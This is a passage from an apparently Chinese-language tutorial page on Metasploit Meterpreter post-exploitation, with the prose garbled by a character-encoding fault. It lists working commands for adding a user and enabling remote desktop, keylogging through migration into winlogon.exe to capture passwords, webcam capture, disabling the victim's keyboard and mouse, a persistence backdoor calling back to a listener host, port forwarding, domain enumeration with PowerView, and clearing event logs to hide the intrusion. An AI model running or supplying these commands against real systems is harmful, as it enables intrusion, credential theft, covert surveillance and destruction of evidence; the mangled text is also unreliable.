PASSWORD=Abc123456 #æ·»åŠ ç”¨æˆ· run post/windows/manage/enable_rdp #å¼€å¯è¿œç¨‹æ¡Œé¢ run post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #å°†3389ç«¯å£è½¬å‘åˆ°6662 </code></pre><h4>å¯ç”¨è¿œç¨‹æ¡Œé¢</h4><p>å½“æˆ‘ä»¬æ–°æ·»åŠ çš„ç”¨æˆ·å·²ç»æ‹¥æœ‰è¿œç¨‹æ¡Œé¢ä¹‹å<br> æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªè´¦å·å‡­è¯æ¥å¼€å¯è¿œç¨‹æ¡Œé¢ä¼šè¯äº†</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿ç›®æ ‡ Windows è®¾å¤‡å¼€å¯äº†è¿œç¨‹æ¡Œé¢åŠŸèƒ½ï¼ˆéœ€è¦å¼€å¯å¤šä¸ªæœåŠ¡ï¼‰<br> æˆ‘ä»¬è¾“å…¥</p><pre><code class="language-bash">run post/windows/manage/enable_rdp </code></pre><p>å‘½ä»¤å¯ä»¥å¼€å¯è¿œç¨‹æ¡Œé¢</p><p>åœ¨å¼€å¯è¿œç¨‹æ¡Œé¢ä¼šè¯ä¹‹å‰<br> æˆ‘ä»¬è¿˜éœ€è¦ä½¿ç”¨ <code>idletime</code> å‘½ä»¤æ£€æŸ¥è¿œç¨‹ç”¨æˆ·çš„ç©ºé—²æ—¶é•¿</p><pre><code class="language-bash">idletime #æ£€æŸ¥è¿œç¨‹ç”¨æˆ·çš„ç©ºé—²æ—¶é•¿ </code></pre><p>å¼€å¯è¿œç¨‹æ¡Œé¢</p><pre><code class="language-bash">run post/windows/manage/enable_rdp </code></pre><h4>é”®ç›˜è®°å½•</h4><p>Meterpreter è¿˜å¯ä»¥åœ¨ç›®æ ‡è®¾å¤‡ä¸Šå®ç°é”®ç›˜è®°å½•åŠŸèƒ½<br> é”®ç›˜è®°å½•ä¸»è¦æ¶‰åŠä»¥ä¸‹ä¸‰ç§å‘½ä»¤</p><pre><code class="language-bash">keyscan_start #å¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ï¼Œå¼€å…³é”®ç›˜è®°å½•åŠŸèƒ½åç›®æ ‡è¾“å…¥çš„å†…å®¹æˆ‘ä»¬å°±é€šè¿‡keyscan_dumpå‘½ä»¤åœ¨Meterpreteré‡Œé¢è¿›è¡ŒæŸ¥çœ‹ï¼› keyscan_dump #æ˜¾ç¤ºæ•æ‰åˆ°çš„é”®ç›˜è®°å½•ä¿¡æ¯ keyscan_stop #åœæ­¢é”®ç›˜è®°å½•åŠŸèƒ½ </code></pre><blockquote><p>åœ¨ä½¿ç”¨é”®ç›˜è®°å½•åŠŸèƒ½æ—¶<br> é€šå¸¸éœ€è¦è·Ÿç›®æ ‡è¿›ç¨‹è¿›è¡Œç»‘å®š<br> ç„¶åè·å–è¯¥è¿›ç¨‹ä¸‹çš„é”®ç›˜è®°å½•</p></blockquote><h4>è¿›ç¨‹è¿ç§»</h4><p>Meterpreter æ—¢å¯ä»¥å•ç‹¬è¿è¡Œ<br> ä¹Ÿå¯ä»¥ä¸å…¶ä»–è¿›ç¨‹è¿›è¡Œç»‘å®š<br> å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è®© <code>Meterpreter</code> ä¸ç±»ä¼¼ <code>explorer.exe</code> è¿™æ ·çš„è¿›ç¨‹è¿›è¡Œç»‘å®š<br> å¹¶ä»¥æ­¤æ¥å®ç°æŒä¹…åŒ–</p><p>åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­<br> æˆ‘ä»¬ä¼šå°† <code>Meterpreter</code> è·Ÿ <code>winlogon.exe</code> ç»‘å®š<br> å¹¶åœ¨ç™»å½•è¿›ç¨‹ä¸­æ•è·é”®ç›˜è®°å½•ï¼Œä»¥è·å¾—ç”¨æˆ·çš„å¯†ç </p><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ <code>ps</code> å‘½ä»¤æŸ¥çœ‹ç›®æ ‡è®¾å¤‡ä¸­è¿è¡Œçš„è¿›ç¨‹</p><pre><code class="language-bash">ps </code></pre><p>ä½¿ç”¨ <code>getpid</code> æŸ¥çœ‹æˆ‘ä»¬å½“å‰çš„è¿›ç¨‹ id</p><pre><code class="language-bash">getpid </code></pre><p>ä½¿ç”¨ <code>migrate + ç›®æ ‡è¿›ç¨‹ID</code> å‘½ä»¤æ¥ç»‘å®šç›®æ ‡è¿›ç¨‹ id<br> é€šè¿‡è¿›ç¨‹è¿ç§»å<br> å½“å‰çš„ <code>Meterpreter</code> çš„ <code>pid</code> å·²ç»å’Œ <code>winlogon.exe</code> ä¸€æ ·äº†</p><pre><code class="language-bash">migrate 123 </code></pre><p>è¿™é‡Œç»‘å®šç›®æ ‡ <code>pid</code> çš„æ—¶å€™ï¼Œç»å¸¸ä¼šæ–­äº† <code>shell</code><br> è¿›ç¨‹è¿ç§»åä¼šè‡ªåŠ¨å…³é—­åŸæ¥ <code>Meterpreter</code> è¿›ç¨‹<br> æ²¡æœ‰å…³é—­å¯ä½¿ç”¨ <code>kill pid</code> å‘½ä»¤å…³é—­è¿›ç¨‹ã€‚</p><p>æˆ–è€…ä½¿ç”¨è‡ªåŠ¨è¿ç§»è¿›ç¨‹</p><pre><code class="language-bash">run post/windows/manage/migrate </code></pre><p>ç³»ç»Ÿä¼šè‡ªåŠ¨å¯»æ‰¾åˆé€‚çš„è¿›ç¨‹ç„¶åè¿ç§»</p><h4>ç¦æ­¢ç›®æ ‡ä¸»æœºä½¿ç”¨é”®ç›˜é¼ æ ‡</h4><pre><code class="language-bash">uictl disable(enable) keyboard #ç¦æ­¢(å…è®¸)ç›®æ ‡ä½¿ç”¨é”®ç›˜ uictl disable(enable) mouse #ç¦æ­¢(å…è®¸)ç›®æ ‡ä½¿ç”¨é¼ æ ‡ </code></pre><h4>ç”¨ç›®æ ‡ä¸»æœºæ‘„åƒå¤´æ‹ç…§</h4><pre><code class="language-bash">webcam_list #è·å–ç›®æ ‡ç³»ç»Ÿçš„æ‘„åƒå¤´åˆ—è¡¨ webcam_snap #ä»æŒ‡å®šçš„æ‘„åƒå¤´ï¼Œæ‹æ‘„ç…§ç‰‡ webcam_stream #ä»æŒ‡å®šçš„æ‘„åƒå¤´ï¼Œå¼€å¯è§†é¢‘ </code></pre><h4>å¸¸ç”¨æ‰©å±•åº“ä»‹ç»</h4><blockquote><p><code>Meterpreter</code> ä¸­ä¸ä»…æœ‰åŸºæœ¬å‘½ä»¤è¿˜æœ‰å¾ˆå¤šæ‰©å±•åº“<br> ä¸‹é¢å°±ä»‹ç»ä¸€ä¸‹å¸¸ç”¨çš„æ‰©å±•åº“çš„æŸ¥çœ‹æ–¹æ³•</p></blockquote><h5>load/use å‘½ä»¤</h5><pre><code class="language-bash">load/use #åŠ è½½æ¨¡å— load -l #åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ‰©å±• load -help #å¸®åŠ©ï¼›è¯´æ˜ </code></pre><p>å‘½ä»¤ <code>load -l</code> ä¼šåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ‰©å±•</p><p>è¾“å…¥ <code>load</code> å <code>åŒå‡»Tabé”®</code> ä¹Ÿå¯ä»¥åˆ—å‡ºå¯ç”¨æ‰©å±•</p><h5>run å‘½ä»¤</h5><pre><code class="language-bash">run #æ‰§è¡Œä¸€ä¸ªå·²æœ‰çš„æ¨¡å— </code></pre><p><code>run+åŒå‡»Tabé”®</code> ä¼šåˆ—å‡ºæ‰€æœ‰çš„å·²æœ‰çš„è„šæœ¬ï¼›<br> å¸¸ç”¨çš„æœ‰ <code>autoroute</code> , <code>hashdump</code> , <code>arp_scanner</code> , <code>multi_meter_inject</code> ç­‰</p><h4>ç”ŸæˆæŒç»­æ€§åé—¨</h4><blockquote><p>å› ä¸º <code>Meterpreter</code> æ˜¯åŸºäº <code>å†…å­˜DLL</code> å»ºç«‹çš„è¿æ¥<br> æ‰€ä»¥ï¼Œåªè¦ç›®æ ‡ä¸»æœºå…³æœºï¼Œæˆ‘ä»¬çš„è¿æ¥å°±ä¼šæ–­<br> æ€»ä¸å¯èƒ½æˆ‘ä»¬æ¯æ¬¡æƒ³è¿æ¥çš„æ—¶å€™ï¼Œæ¯æ¬¡éƒ½å»æ”»å‡»<br> ç„¶åå†åˆ©ç”¨ <code>Meterpreter</code> å»ºç«‹è¿æ¥<br> æ‰€ä»¥ï¼Œæˆ‘ä»¬å¾—åœ¨ç›®æ ‡ä¸»æœºç³»ç»Ÿå†…ç•™ä¸‹ä¸€ä¸ª<code>æŒç»­æ€§çš„åé—¨</code><br> åªè¦ç›®æ ‡ä¸»æœº<code>å¼€æœº</code>äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿æ¥åˆ°è¯¥ä¸»æœº</p></blockquote><p>å»ºç«‹æŒç»­æ€§åé—¨æœ‰ä¸¤ç§æ–¹æ³•<br> - é€šè¿‡å¯åŠ¨é¡¹å¯åŠ¨ <code>persistence</code><br> - é€šè¿‡æœåŠ¡å¯åŠ¨ <code>metsvc</code></p><h5>å¯åŠ¨é¡¹å¯åŠ¨</h5><p>å…ˆä½¿ç”¨ <code>Msfvenonm</code> ç”Ÿæˆä¸€ä¸ªåé—¨æœ¨é©¬<br> ç„¶åæ”¾åˆ° <code>windowsçš„å¯åŠ¨ç›®å½•</code> ä¸­</p><blockquote><p>C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br> è¿™æ ·è¿™ä¸ªåé—¨æ¯æ¬¡å¼€æœºå°±éƒ½èƒ½å¯åŠ¨äº†<br> ç„¶åæˆ‘ä»¬åªè¦ç›¸è¿å°±ç›‘å¬ç›¸åº”çš„ç«¯å£å°±è¡Œäº†</p></blockquote><h5>æœåŠ¡å¯åŠ¨</h5><pre><code class="language-bash">run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888 #è‡ªåŠ¨è¿æ¥192.168.100.158çš„8888ç«¯å£ï¼Œç¼ºç‚¹æ˜¯å®¹æ˜“è¢«æ€æ¯’è½¯ä»¶æŸ¥æ€ </code></pre><p>ç„¶åå®ƒå°±åœ¨ç›®æ ‡æœºæ–°å»ºäº†è¿™ä¸ªæ–‡ä»¶<br> C:\Windows\TEMP****.vbs <br> å¹¶æŠŠè¯¥æœåŠ¡åŠ å…¥äº†æ³¨å†Œè¡¨ä¸­<br> åªè¦å¼€æœºå°±ä¼šå¯åŠ¨</p><h4>PortFwd ç«¯å£è½¬å‘</h4><p><code>portfwd</code> æ˜¯ <code>Meterpreter</code> æä¾›çš„ä¸€ç§åŸºæœ¬çš„<code>ç«¯å£è½¬å‘</code><br><code>porfwd</code> å¯ä»¥ <code>åå¼¹å•ä¸ªç«¯å£</code> åˆ° <code>æœ¬åœ°</code>, å¹¶ä¸” <code>ç›‘å¬</code><br> ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><pre><code class="language-bash">portfwd add -l 9999 -r 192.168.100.158 -p 3389 #å°†192.168.100.158çš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„9999ç«¯å£ä¸Šï¼Œè¿™é‡Œçš„192.168.100.158æ˜¯è·å–æƒé™çš„ä¸»æœºçš„ipåœ°å€ -l: #æœ¬åœ°ç›‘å¬çš„ç«¯å£ï¼Œç”¨äºæ¥æ”¶ç›®æ ‡ä¸»æœºçš„ç«¯å£åå¼¹ -p: #ç›®æ ‡æœåŠ¡å™¨çš„ç«¯å£ï¼› add: #æ·»åŠ ä¸€ä¸ªè¿æ¥ </code></pre><p>ç„¶åæˆ‘ä»¬åªè¦è®¿é—®<code>æœ¬åœ°</code>çš„ <code>3389</code> ç«¯å£å°±å¯ä»¥è¿æ¥åˆ°<code>ç›®æ ‡ä¸»æœº</code>çš„ <code>3389</code>ç«¯å£äº†</p><pre><code class="language-bash">rdesktop 127.0.0.1:9999 </code></pre><p>å¦‚æœä¸æƒ³ç»§ç»­è¿æ¥çš„è¯<br> å¯ä»¥åˆ é™¤å½“å‰å»ºç«‹çš„è¿æ¥<br> æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><pre><code class="language-bash">portfwd delet -l 9999 -r 192.168.100.158 -p 3389 delet #åˆ é™¤ä¸€ä¸ªè¿æ¥ </code></pre><h4>æ¸…é™¤äº‹ä»¶æ—¥å¿—</h4><p>å®Œæˆæ”»å‡»æ“ä½œä¹‹å<br> åƒä¸‡åˆ«å¿˜äº† "æ‰“æ‰«æˆ˜åœº"<br> æˆ‘ä»¬çš„æ‰€æœ‰æ“ä½œéƒ½ä¼šè¢«è®°å½•åœ¨ç›®æ ‡ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ä¹‹ä¸­<br> å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨å®Œæˆæ”»å‡»ä¹‹åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ¸…é™¤äº‹ä»¶æ—¥å¿—</p><pre><code class="language-bash">clearev #æ¸…é™¤äº‹ä»¶æ—¥å¿— </code></pre><h3>å¯¼å…¥å¹¶æ‰§è¡Œ PowerShell è„šæœ¬</h3><p>å¦‚æœ <code>powershell</code> è„šæœ¬æ˜¯ç”¨äºåŸŸå†…ä¿¡æ¯æ”¶é›†çš„<br> åˆ™è·å–åˆ°çš„æƒé™ç”¨æˆ·éœ€è¦æ˜¯åŸŸç”¨æˆ·</p><pre><code class="language-bash">load powershell #åŠ è½½powershellåŠŸèƒ½ powershell_import /root/PowerView.ps1 #å¯¼å…¥powershellè„šæœ¬ï¼Œæå‰å°†è¯¥powershellè„šæœ¬æ”¾åˆ°æŒ‡å®šç›®å½• powershell_execute Get-NetDomain #æ‰§è¡Œè¯¥è„šæœ¬ä¸‹çš„åŠŸèƒ½æ¨¡å—Get-domainï¼Œè¯¥æ¨¡å—ç”¨äºè·å–åŸŸä¿¡æ¯ï¼Œä¸€ä¸ªè„šæœ¬ä¸‹é€šå¸¸æœ‰å¤šä¸ªåŠŸèƒ½æ¨¡å—;è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°; powershell_execute Invoke-UserHunter #è¯¥åŠŸèƒ½æ¨¡å—ç”¨äºå®šä½åŸŸç®¡ç†å‘˜ç™»å½•çš„ä¸»æœº; powershell_execute Get-NetForest #è¯¥æ¨¡å—ç”¨äºå®šä½åŸŸä¿¡æ¯ powershell_execute Invoke-EnumerateLocalAdmin #æšä¸¾åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºä¸Šæœ¬åœ°ç®¡ç†å‘˜ç»„çš„æˆå‘˜ </code></pre><h3>åŠ è½½ stdapi</h3><p>æœ‰æ—¶å€™è™½ç„¶æˆ‘ä»¬è·å–åˆ°äº† <code>Meterpreter</code><br> ä½†æ˜¯æ‰§è¡Œä¸€äº›å‘½ä»¤ä¼šæ˜¾ç¤ºæ²¡æœ‰è¯¥å‘½ä»¤<br> è¿™æ—¶æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ <code>load stdapi</code> æ¥åŠ è½½<br> è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p><h3>å‡çº§ Session</h3><p>æœ‰æ—¶å€™ï¼Œå½“æˆ‘ä»¬æ”¶åˆ°çš„ä¸æ˜¯ <code>Meterpreter</code> ç±»å‹çš„ <code>session</code> çš„è¯<br> å¯èƒ½ä¸å¥½æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‘½ä»¤ <code>sessions -u id</code> æ¥å‡çº§ <code>session</code><br> æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œé»˜è®¤è°ƒç”¨çš„æ˜¯ <code>post/multi/manage/shell_to_meterpreter</code> æ¨¡å—</p></article><hr><p><a href="/">â† index</a></p><footer><img src="/0unz.png" alt="0u logo" class="footer-logo"></footer></body></html>